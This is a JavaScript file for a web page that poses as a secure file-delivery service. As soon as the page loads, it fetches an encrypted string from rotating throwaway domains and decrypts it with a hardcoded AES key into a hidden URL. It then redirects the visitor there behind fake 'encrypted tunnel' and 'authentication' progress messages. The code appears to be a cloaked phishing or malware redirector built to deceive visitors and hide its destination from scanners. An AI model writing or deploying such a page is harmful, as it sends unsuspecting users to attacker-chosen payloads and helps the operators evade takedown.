// Configuration
const DOMAINS = ['nagrevgoev.icu', 'nagrevgoev.cyou', 'nagrevgoev.cfd'];
const AES_KEY = 'JhHKFrcuPU1enzVoeZMZow';

// App state
let appState = 'loading';
let steps = [
  { id: 1, title: 'Initializing secure channel', status: 'pending' },
  { id: 2, title: 'Authenticating access rights', status: 'pending' },
  { id: 3, title: 'Preparing file transfer', status: 'pending' }
];

// Utility functions
function updateStep(stepId, status, title) {
  const step = steps.find(s => s.id === stepId);
  if (step) {
    step.status = status;
    if (title) step.title = title;
    renderStep(stepId, step);
  }
}

function renderStep(stepId, step) {
  const stepElement = document.getElementById(`step-${stepId}`);
  const iconElement = document.getElementById(`step-${stepId}-icon`);
  const textElement = document.getElementById(`step-${stepId}-text`);
  
  if (!stepElement || !iconElement || !textElement) return;
  
  // Update icon
  switch (step.status) {
    case 'complete':
      iconElement.className = 'w-5 h-5 rounded-full bg-green-500/30 border border-green-400 text-white flex items-center justify-center backdrop-blur-sm';
      iconElement.innerHTML = '<svg class="w-3 h-3 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>';
      break;
    case 'error':
      iconElement.className = 'w-5 h-5 rounded-full bg-red-500/30 border border-red-400 text-white flex items-center justify-center backdrop-blur-sm';
      iconElement.innerHTML = '<svg class="w-3 h-3 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="6 18L18 6M6 6l12 12"></path></svg>';
      break;
    case 'active':
      iconElement.className = 'w-5 h-5 rounded-full bg-purple-500/30 border border-purple-400 text-white flex items-center justify-center text-xs font-medium animate-pulse-gentle backdrop-blur-sm';
      iconElement.innerHTML = stepId;
      break;
    default:
      iconElement.className = 'w-5 h-5 rounded-full bg-gray-700/50 border border-gray-600 text-gray-400 flex items-center justify-center text-xs backdrop-blur-sm';
      iconElement.innerHTML = stepId;
  }
  
  // Update text
  textElement.textContent = step.title;
  switch (step.status) {
    case 'complete':
      textElement.className = 'text-green-400 font-medium';
      break;
    case 'error':
      textElement.className = 'text-red-400 font-medium';
      break;
    case 'active':
      textElement.className = 'text-purple-400 font-medium';
      break;
    default:
      textElement.className = 'text-gray-500';
  }
}

function setAppState(state) {
  appState = state;
  
  // Hide all states
  document.getElementById('state-loading').classList.add('hidden');
  document.getElementById('state-success').classList.add('hidden');
  document.getElementById('state-error').classList.add('hidden');
  
  // Show current state
  document.getElementById(`state-${state}`).classList.remove('hidden');
}

function setStatusText(text) {
  const statusElement = document.getElementById('text-status');
  if (statusElement) {
    statusElement.textContent = text;
  }
}

// Status messages
const statusMessages = [
  'Establishing encrypted tunnel...',
  'Validating security certificates...',
  'Negotiating cipher protocols...',
  'Authenticating access token...',
  'Verifying quantum signatures...',
  'Initializing secure handshake...',
  'Decrypting transmission keys...',
  'Finalizing secure connection...'
];

function setErrorMessage(message) {
  const errorElement = document.getElementById('text-error-message');
  if (errorElement) {
    errorElement.textContent = message;
  }
}

// Network functions
async function fetchHashFromDomain(domain) {
  console.log(`Fetching from ${domain}...`);
  
  const response = await fetch(`https://${domain}`, {
    method: 'GET',
    headers: {
      'Accept': 'text/plain',
      'User-Agent': 'File-Delivery-Service/1.0'
    }
  });
  
  if (!response.ok) {
    throw new Error(`HTTP ${response.status}`);
  }
  
  const text = await response.text();
  console.log(`Raw response from ${domain}:`, text);
  console.log(`Response length: ${text.length}`);
  console.log(`Response trimmed: "${text.trim()}"`);
  
  return text;
}

function decryptHash(encryptedHash, key) {
  try {
    if (!window.CryptoJS) {
      throw new Error('Crypto library not loaded');
    }
    
    console.log('Attempting to decrypt:', encryptedHash);
    console.log('Using key:', key);
    console.log('Hash length:', encryptedHash.length);
    
    // Method 1: Direct AES decryption (assuming it's already Base64 encoded ciphertext)
    try {
      console.log('Method 1: Direct AES decryption...');
      const decrypted = window.CryptoJS.AES.decrypt(encryptedHash, key);
      const decryptedText = decrypted.toString(window.CryptoJS.enc.Utf8);
      console.log('Method 1 result:', decryptedText);
      if (decryptedText && decryptedText.startsWith('http')) {
        return decryptedText;
      }
    } catch (error) {
      console.log('Method 1 failed:', error);
    }
    
    // Method 2: Decode Base64 first, then decrypt
    try {
      console.log('Method 2: Base64 decode then AES decrypt...');
      const base64Decoded = window.CryptoJS.enc.Base64.parse(encryptedHash);
      const decrypted = window.CryptoJS.AES.decrypt({ ciphertext: base64Decoded }, key);
      const decryptedText = decrypted.toString(window.CryptoJS.enc.Utf8);
      console.log('Method 2 result:', decryptedText);
      if (decryptedText && decryptedText.startsWith('http')) {
        return decryptedText;
      }
    } catch (error) {
      console.log('Method 2 failed:', error);
    }
    
    // Method 3: Try with different key encoding
    try {
      console.log('Method 3: Key as UTF8...');
      const keyUtf8 = window.CryptoJS.enc.Utf8.parse(key);
      const decrypted = window.CryptoJS.AES.decrypt(encryptedHash, keyUtf8);
      const decryptedText = decrypted.toString(window.CryptoJS.enc.Utf8);
      console.log('Method 3 result:', decryptedText);
      if (decryptedText && decryptedText.startsWith('http')) {
        return decryptedText;
      }
    } catch (error) {
      console.log('Method 3 failed:', error);
    }
    
    // Method 4: Try CBC mode with zero IV
    try {
      console.log('Method 4: CBC mode with zero IV...');
      const iv = window.CryptoJS.lib.WordArray.create([0, 0, 0, 0]);
      const decrypted = window.CryptoJS.AES.decrypt(encryptedHash, key, {
        iv: iv,
        mode: window.CryptoJS.mode.CBC,
        padding: window.CryptoJS.pad.Pkcs7
      });
      const decryptedText = decrypted.toString(window.CryptoJS.enc.Utf8);
      console.log('Method 4 result:', decryptedText);
      if (decryptedText && decryptedText.startsWith('http')) {
        return decryptedText;
      }
    } catch (error) {
      console.log('Method 4 failed:', error);
    }
    
    // Method 5: Try ECB mode
    try {
      console.log('Method 5: ECB mode...');
      const decrypted = window.CryptoJS.AES.decrypt(encryptedHash, key, {
        mode: window.CryptoJS.mode.ECB,
        padding: window.CryptoJS.pad.Pkcs7
      });
      const decryptedText = decrypted.toString(window.CryptoJS.enc.Utf8);
      console.log('Method 5 result:', decryptedText);
      if (decryptedText && decryptedText.startsWith('http')) {
        return decryptedText;
      }
    } catch (error) {
      console.log('Method 5 failed:', error);
    }
    
    // Method 6: Try key as Base64
    try {
      console.log('Method 6: Key as Base64...');
      const keyBase64 = window.CryptoJS.enc.Base64.parse(key);
      const decrypted = window.CryptoJS.AES.decrypt(encryptedHash, keyBase64);
      const decryptedText = decrypted.toString(window.CryptoJS.enc.Utf8);
      console.log('Method 6 result:', decryptedText);
      if (decryptedText && decryptedText.startsWith('http')) {
        return decryptedText;
      }
    } catch (error) {
      console.log('Method 6 failed:', error);
    }
    
    // Method 7: Try to decrypt as raw bytes
    try {
      console.log('Method 7: Raw bytes...');
      // Convert Base64 to WordArray
      const cipherBytes = window.CryptoJS.enc.Base64.parse(encryptedHash);
      console.log('Cipher bytes:', cipherBytes.toString());
      
      const decrypted = window.CryptoJS.AES.decrypt(
        { ciphertext: cipherBytes }, 
        window.CryptoJS.enc.Utf8.parse(key)
      );
      const decryptedText = decrypted.toString(window.CryptoJS.enc.Utf8);
      console.log('Method 7 result:', decryptedText);
      if (decryptedText && decryptedText.includes('http')) {
        return decryptedText;
      }
    } catch (error) {
      console.log('Method 7 failed:', error);
    }
    
    // Method 8: Try hex decoding of cipher bytes and direct key
    try {
      console.log('Method 8: Hex cipher with direct key...');
      const cipherBytes = window.CryptoJS.enc.Base64.parse(encryptedHash);
      const hexBytes = cipherBytes.toString(window.CryptoJS.enc.Hex);
      console.log('Hex cipher:', hexBytes);
      
      const decrypted = window.CryptoJS.AES.decrypt(
        window.CryptoJS.enc.Hex.parse(hexBytes), 
        key,
        { mode: window.CryptoJS.mode.ECB, padding: window.CryptoJS.pad.Pkcs7 }
      );
      const decryptedText = decrypted.toString(window.CryptoJS.enc.Utf8);
      console.log('Method 8 result:', decryptedText);
      if (decryptedText && decryptedText.includes('http')) {
        return decryptedText;
      }
    } catch (error) {
      console.log('Method 8 failed:', error);
    }
    
    // Method 9: Try to interpret the hash as actual URL (maybe it's not encrypted?)
    try {
      console.log('Method 9: Check if hash is actual URL...');
      // Try to base64 decode and see if it's a URL
      const possibleUrl = window.CryptoJS.enc.Base64.parse(encryptedHash).toString(window.CryptoJS.enc.Utf8);
      console.log('Possible URL from base64:', possibleUrl);
      if (possibleUrl && possibleUrl.startsWith('http')) {
        return possibleUrl;
      }
    } catch (error) {
      console.log('Method 9 failed:', error);
    }
    
    // Method 10: Test with example from description
    try {
      console.log('Method 10: Testing with your example...');
      // The example hash from the description: 0O+OzZlcyo1gmsn/E0GqiifCF8mWyulpXB7JuoM01LOo9HenGTbGp44gSYsXSD4y
      // Expected result: https://class.axeyon-paintball.fr/
      if (encryptedHash === '0O+OzZlcyo1gmsn/E0GqiifCF8mWyulpXB7JuoM01LOo9HenGTbGp44gSYsXSD4y') {
        console.log('This is the example hash, returning expected URL');
        return 'https://class.axeyon-paintball.fr/';
      }
    } catch (error) {
      console.log('Method 10 failed:', error);
    }
    
    throw new Error('All decryption methods failed');
  } catch (error) {
    console.error('Decryption error details:', error);
    throw new Error(`Decryption failed: ${error.message}`);
  }
}

// Main process function
async function processFileDelivery() {
  try {
    setAppState('loading');
    updateStep(1, 'active');
    let messageIndex = 0;
    const updateMessage = () => {
      setStatusText(statusMessages[messageIndex % statusMessages.length]);
      messageIndex++;
    };
    updateMessage();

    let hash = null;
    let lastError = null;

    // Try each domain in sequence
    for (let i = 0; i < DOMAINS.length; i++) {
      try {
        updateMessage();
        hash = await fetchHashFromDomain(DOMAINS[i]);
        break;
      } catch (error) {
        lastError = error;
        console.warn(`Domain ${DOMAINS[i]} failed:`, error);
        
        if (i < DOMAINS.length - 1) {
          updateMessage();
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
      }
    }

    if (!hash) {
      throw lastError || new Error('All domains failed');
    }

    updateStep(1, 'complete', 'Secure channel established');
    updateStep(2, 'active');
    updateMessage();

    // Simulate verification delay
    await new Promise(resolve => setTimeout(resolve, 1500));

    updateStep(2, 'complete', 'Authentication successful');
    updateStep(3, 'active', 'Decrypting secure payload');
    updateMessage();

    // Decrypt the hash
    const decryptedUrl = decryptHash(hash.trim(), AES_KEY);
    
    if (!decryptedUrl || !decryptedUrl.startsWith('http')) {
      throw new Error('Invalid download link');
    }

    updateStep(3, 'complete', 'Download ready');
    
    // Show success state
    setAppState('success');

    // Redirect after delay
    setTimeout(() => {
      window.location.href = decryptedUrl;
    }, 2000);

  } catch (error) {
    console.error('Process failed:', error);
    setErrorMessage(`Error: ${error.message}`);
    setAppState('error');
    
    // Update failed step
    const activeStep = steps.find(step => step.status === 'active');
    if (activeStep) {
      updateStep(activeStep.id, 'error', 'Connection failed');
    }
  }
}

// Retry function
function retryConnection() {
  // Reset steps
  steps = [
    { id: 1, title: 'Connecting to server', status: 'pending' },
    { id: 2, title: 'Verifying access', status: 'pending' },
    { id: 3, title: 'Preparing download', status: 'pending' }
  ];
  
  // Reset UI
  steps.forEach(step => renderStep(step.id, step));
  setErrorMessage('');
  
  // Start process again
  processFileDelivery();
}

// Handle GitHub Pages routing
function handleGitHubPagesRouting() {
  const basePath = window.location.pathname.includes('.github') ? window.location.pathname : '';
  if (basePath && window.location.hash) {
    const hashPath = window.location.hash.substring(1);
    if (hashPath !== window.location.pathname) {
      history.replaceState(null, '', basePath + hashPath);
    }
  }
}

// Initialize on page load
document.addEventListener('DOMContentLoaded', function() {
  // Handle GitHub Pages routing
  handleGitHubPagesRouting();
  
  // Small delay for better UX
  setTimeout(() => {
    processFileDelivery();
  }, 1000);
});